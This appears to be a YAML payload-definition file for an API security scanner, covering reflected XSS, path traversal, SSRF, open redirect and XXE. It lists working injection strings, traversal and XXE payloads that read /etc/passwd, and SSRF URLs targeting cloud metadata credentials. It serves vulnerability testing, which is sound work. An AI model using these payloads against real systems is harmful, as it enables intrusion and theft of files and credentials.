# Reflected XSS, path traversal / LFI, SSRF, open redirect, XXE.
vectors:
  - id: xss-reflected
    class: xss
    title: Reflected Cross-Site Scripting / HTML injection
    severity: medium
    cwe: CWE-79
    owasp: "API8:2023"
    description: >
      Injects a unique HTML/JS marker; if it is reflected unencoded in an
      HTML response the endpoint is vulnerable to reflected XSS.
    references:
      - https://owasp.org/www-community/attacks/xss/
      - https://portswigger.net/web-security/cross-site-scripting/reflected
    applies_to:
      locations: [query, path, body, header]
      types: [string, any]
    payloads:
      - {value: "<script>OFFATMARKER</script>", technique: reflection}
      - {value: "\"><img src=x onerror=OFFATMARKER>", technique: reflection}
      - {value: "'\"><svg/onload=OFFATMARKER>", technique: reflection}
    detection:
      reflect_marker: true

  - id: path-traversal
    class: path_traversal
    title: Path Traversal / Local File Inclusion
    severity: high
    cwe: CWE-22
    owasp: "API8:2023"
    description: >
      Walks out of the intended directory to read sensitive files; known file
      contents in the response confirm the traversal.
    references:
      - https://owasp.org/www-community/attacks/Path_Traversal
    applies_to:
      locations: [query, path, body]
      types: [string, any]
      name_patterns: ["(?i)(file|path|dir|folder|name|template|page|doc|download|load|include|url)"]
    payloads:
      - {value: "../../../../etc/passwd", technique: error}
      - {value: "..%2f..%2f..%2f..%2fetc%2fpasswd", technique: error, encoding: none}
      - {value: "....//....//....//etc/passwd", technique: error}
      - {value: "..\\..\\..\\..\\windows\\win.ini", technique: error}
    detection:
      body_regex:
        - "root:.*:0:0:"
        - "\\[fonts\\]"
        - "\\[extensions\\]"

  - id: ssrf
    class: ssrf
    title: Server-Side Request Forgery
    severity: high
    cwe: CWE-918
    owasp: "API7:2023 Server Side Request Forgery"
    description: >
      Supplies attacker-chosen URLs (including cloud metadata and internal
      hosts) to parameters that fetch resources server-side.
    references:
      - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
      - https://portswigger.net/web-security/ssrf
    applies_to:
      locations: [query, body, path]
      types: [string, any]
      name_patterns: ["(?i)(url|uri|link|src|source|dest|target|callback|webhook|redirect|fetch|host|domain|feed|image|proxy)"]
    payloads:
      - {value: "http://169.254.169.254/latest/meta-data/", technique: reflection, note: "AWS IMDS"}
      - {value: "http://metadata.google.internal/computeMetadata/v1/", technique: reflection, note: "GCP"}
      - {value: "http://127.0.0.1:80/", technique: diff}
      - {value: "http://localhost/", technique: diff}
      - {value: "file:///etc/passwd", technique: error}
    detection:
      body_regex:
        - "ami-id"
        - "instance-id"
        - "iam/security-credentials"
        - "root:.*:0:0:"
      error_signatures:
        - "connection refused"
        - "no route to host"

  - id: open-redirect
    class: open_redirect
    title: Open Redirect
    severity: medium
    cwe: CWE-601
    owasp: "API8:2023"
    description: >
      Supplies an external URL to a redirect parameter; a 3xx Location header
      pointing at the attacker host confirms the open redirect.
    references:
      - https://owasp.org/www-project-web-security-testing-guide/
    applies_to:
      locations: [query, body]
      types: [string, any]
      name_patterns: ["(?i)(redirect|return|next|url|goto|dest|continue|callback|back|to)"]
    payloads:
      - {value: "https://offat-oob.example/", technique: status}
      - {value: "//offat-oob.example/", technique: status}
    detection:
      status_codes: [301, 302, 303, 307, 308]
      body_regex:
        - "offat-oob.example"

  - id: xxe
    class: xxe
    title: XML External Entity Injection
    severity: high
    cwe: CWE-611
    owasp: "API8:2023"
    description: >
      Sends an XML body declaring an external entity that reads a local file;
      reflected file contents confirm XXE.
    references:
      - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
    applies_to:
      locations: [body]
      types: [any]
      methods: [POST, PUT, PATCH]
    payloads:
      - value: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
        technique: error
    detection:
      body_regex:
        - "root:.*:0:0:"
      error_signatures:
        - "doctype is not allowed"
        - "external entity"
